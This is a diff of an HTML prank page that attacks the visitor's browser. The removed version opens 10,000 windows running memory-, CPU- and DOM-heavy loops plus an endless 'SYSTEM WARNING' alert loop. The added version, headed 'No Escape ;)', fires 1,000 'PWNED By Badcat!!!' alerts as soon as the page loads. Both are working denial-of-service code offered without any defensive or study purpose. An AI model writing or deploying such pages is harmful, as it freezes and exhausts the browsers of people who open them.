@@ -1,42 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Have A nice dream</title>
+</head>
 <body>
-<button onclick="magic2()">Start Process</button>
-
-<script>
-function magic2() {
-    // Buka banyak windows secara bersamaan
-    for(let i = 0; i < 10000; i++) {
-        const w = window.open('', `win${i}`);
-        
-        // Infinite loop dengan resource intensive operations
-        setInterval(() => {
-            // Memory intensive operations
-            const hugeArray = new Array(1000000).fill('X');
-            const massiveString = hugeArray.join('');
-            
-            // CPU intensive
-            for(let j = 0; j < 100000; j++) {
-                Math.sqrt(Math.random() * Math.PI);
+    <h1>No Escape ;)</h1>
+    <script>
+      
+            for (let i = 1; i <= 1000; i++) {
+               
+                    alert("PWNED "+"By "+"Badcat!!!");
+              
             }
-            
-            // DOM manipulation intensive
-            try {
-                w.document.body.innerHTML = massiveString.substring(0, 10000);
-            } catch(e) {}
-            
-        }, 100);
-    }
-    
-    // Juga trigger alert loops
-    setTimeout(() => {
-        const alertLoop = () => {
-            alert('SYSTEM WARNING');
-            setTimeout(alertLoop, 100);
-        };
-        alertLoop();
-    }, 2000);
-}
-</script>
+       
+    </script>
 </body>
 </html>
